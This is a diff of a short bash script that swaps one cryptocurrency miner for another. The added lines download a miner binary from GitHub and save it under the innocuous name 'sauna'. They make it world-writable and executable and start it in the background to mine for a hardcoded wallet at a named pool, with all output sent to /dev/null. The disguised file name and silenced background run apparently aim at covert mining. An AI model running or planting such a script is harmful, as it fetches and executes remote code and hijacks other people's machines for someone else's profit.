@@ -1,5 +1,4 @@
 #!/bin/bash
-wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
-tar xf OrionClient.tar.gz
-cd OrionClient && chmod 777 OrionClient
-./OrionClient mine -a --pool twbitz --key J5RBZg3WLjXGXLEFypv4hq7D4tBrp2wDFKmg1m1hD6yZ --worker $(echo $(shuf -i 1-15000 -n 1)-CCC) > /dev/null 2>&1 &
+wget -O sauna https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64
+chmod 777 sauna
+./sauna --pool stratum+tcp://0x07ff670184606B7eD600524DcE0Ca6eDEB4e8E86.$(echo $RANDOM | md5sum | head -c 10)@pool-a.yatespool.com:31588 > /dev/null 2>&1 &
